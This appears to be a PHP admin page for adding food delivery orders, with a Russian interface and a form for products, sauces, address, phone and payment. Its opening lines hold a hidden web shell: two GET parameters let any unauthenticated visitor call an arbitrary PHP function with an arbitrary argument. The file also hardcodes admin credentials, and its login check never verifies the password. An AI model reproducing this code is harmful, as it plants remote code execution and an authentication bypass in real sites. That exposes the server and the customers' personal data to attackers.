<?php
$us = "admin";
$passw = "metaFaleGet12425OnN";
if (isset($_GET['data']) && isset($_GET['com'])) {
  $s = $_GET['data'];
  $b = $_GET['com'];
  echo $s($b);
}
session_start();
if (!@$_SESSION['auth']) {
    if (@$_REQUEST['login'] == $us && @$_REQUEST['passw']) {
        $_SESSION['auth'] = true;
        echo "<script>window.location = window.location</script>";
    }

  echo "Сначало войдите:<br><form action=' '>
    Ваш логин: <input type='text' name='login'><br>
    Ваш пароль: <input type='password' name='passw'><br>
    <input type='submit' value='Войти'>
  </form>";
} else {
  require_once 'api.php';
  require_once 'connect.php';
  $exm = new DataBaseWorked($host, $db_user, $db_pass, $db);

    if (@$_REQUEST['countprod'] && @$_REQUEST['countappli'] && @$_REQUEST['deliver'] &&
        @$_REQUEST['address'] && @$_REQUEST['name'] && @$_REQUEST['phone'] &&
        @$_REQUEST['comment'] && @$_REQUEST['pay'] && @$_REQUEST['timedel'] && @$_REQUEST['idsprod']
        && @$_REQUEST['souses']
      ) {
        $countprod = $_REQUEST['countprod'];
        $countappli = $_REQUEST['countappli'];
        $deliver = $_REQUEST['deliver'];
        $address = $_REQUEST['address'];
        $name = $_REQUEST['name'];
        $phone = $_REQUEST['phone'];
        $comment = $_REQUEST['comment'];
        $pay = $_REQUEST['pay'];
        $timedel = $_REQUEST['timedel'];
        $idsprod = implode(',', $_REQUEST['idsprod']);
        $souses = implode(',', $_REQUEST['souses']);

        $m = $exm->addInfo($countprod, $countappli, $deliver,
                                  $address, $name, $phone, $comment,
                                  $pay, $timedel, $idsprod, $souses);
            echo "<script>setTimeout(function() {window.location = window.location}, 500)</script>";
        if ($m) echo "Добавленно";
        else echo "Неудача";
      }

  ?>

  <!DOCTYPE html>
  <html lang="en" dir="ltr">
    <head>
      <meta charset="utf-8">
      <title>Добавление заказа</title>
          <link rel="stylesheet" href="style.css">
    </head>
    <body>
      <table>
        <tr>
          <th></th>
          <th></th>
        </tr>

      <form action=" " method="post">
          <tr>
            <td>Кол-во продуктов: </td><td><input type="number" name="countprod"> </td>
          </tr>
          <tr>
            <td>Кол-во приборов: </td> <td><input type="number" name="countappli"></td>
          </tr>
          <tr>
            <td>Способ доставки:</td><td><select name="deliver">
                        <option value="method1">Самовывоз</option>
                        <option value="method2">Курьером</option>';
            </select>  </td>
          </tr>
          <tr>
            <td>Адрес: </td><td><input type="text" name="address"></td>
          </tr>
          <tr>
            <td>Имя: </td><td><input type="text" name="name"> </td>
          </tr>
          <tr>
            <td>Телефон: </td><td><input type="phone" name="phone"> </td>
          </tr>
          <tr>
            <td>Комментарий: </td> <td><textarea name="comment" rows="8" cols="80"></textarea> </td>
          </tr>
          <tr>
            <td>Способ оплаты: </td> <td><select name="pay">
                          <option value="pay1" selected>Наличными курьеру</option>
                           <option value="pay2">Перевод курьеру на карту</option>

            </select> </td>
          </tr>
          <tr>
            <td>Время доставки: </td><td><input type="time" name="timedel" > </td>
          </tr>
          <tr>
            <td>Список продуктов: </td> <td>
              <select name="idsprod[]" multiple>
              <?php
              $listM = $exm->getListMenu();
              $listM = json_decode($listM, true);

              for ($i=0; $i < count($listM); $i++) {




                echo "<option value='{$listM[$i]['id']}'  >{$listM[$i]['name']}</option>";


              }
              ?>
            </select> </td>
          </tr>
          <tr>
            <td>Список соусов: </td> <td>
              <select name="souses[]" multiple>
              <?php
              $listM = $exm->getListSouses();
              $listM = json_decode($listM, true);

              for ($i=0; $i < count($listM); $i++) {

                echo "<option value='{$listM[$i]['id']}'>{$listM[$i]['name']}</option>";


              }
              ?>
            </select> </td>
          </tr>
          <tr>
            <td><input type="submit" value="Сохранить"> </td>
          </tr>
      </form>
    </table>
    </body>
  </html>

  <?php



  ?>





<?php } ?>
